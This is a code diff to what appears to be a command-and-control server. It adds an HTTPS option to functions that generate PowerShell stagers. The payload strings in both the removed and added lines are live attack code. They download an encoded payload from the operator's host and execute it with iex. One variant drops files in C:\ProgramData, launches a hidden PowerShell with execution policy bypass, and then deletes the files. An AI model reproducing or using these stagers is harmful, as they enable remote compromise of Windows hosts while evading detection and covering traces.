@@ -72,8 +72,11 @@ def stager52():
     ip = request.remote_addr
     p_out = '[+] STAGER PAYLOAD Send (%s)' % ip
     print bcolors.OKGREEN + p_out + bcolors.ENDC
-    stager="$s=(new-object net.webclient).DownloadString('http://{ip}:{port}{b52payload}');$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
-    stager=stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
+    stager="$s=(new-object net.webclient).DownloadString('{HTTP}://{ip}:{port}{b52payload}');$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
+    if SSL==True:
+        stager=stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b52payload}', b52_payload).replace('{HTTP}', "https")
+    else :
+        stager=stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b52payload}', b52_payload).replace('{HTTP}', "http")
     return stager
 
 
@@ -101,9 +104,13 @@ def payloadjf():
     ip = request.remote_addr
     p_out = '[+] Powershell JOB + File PAYLOAD Send (%s)' % ip
     print bcolors.OKGREEN + p_out + bcolors.ENDC
-    payload = '$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString(\'http://{ip}:{port}{b52payload}\');set-content -path c:\\programdata\\a.zip -value $S;set-content -path c:\\programdata\\b.ps1 -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')));Start-Process powershell -ArgumentList "-exec bypass -w 1 -file c:\\programdata\\b.ps1" -WindowStyle Hidden;start-sleep 10;del c:\\programdata\\a.zip;del c:\\programdata\\b.ps1;'
+    payload = '$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString(\'{HTTP}://{ip}:{port}{b52payload}\');set-content -path c:\\programdata\\a.zip -value $S;set-content -path c:\\programdata\\b.ps1 -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')));Start-Process powershell -ArgumentList "-exec bypass -w 1 -file c:\\programdata\\b.ps1" -WindowStyle Hidden;start-sleep 10;del c:\\programdata\\a.zip;del c:\\programdata\\b.ps1;'
     commandF = "$s=(get-content C:\\\\ProgramData\\\\a.zip);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
-    payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
+    #payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
+    if SSL==True:
+        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload).replace('{HTTP}', "https")
+    else :
+        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload).replace('{HTTP}', "http")
     commandF = commandF.encode('base64').replace('\n', '')
     payload = payload.replace('{payload}', commandF)
     payload = payload.encode('base64').replace('\n', '')
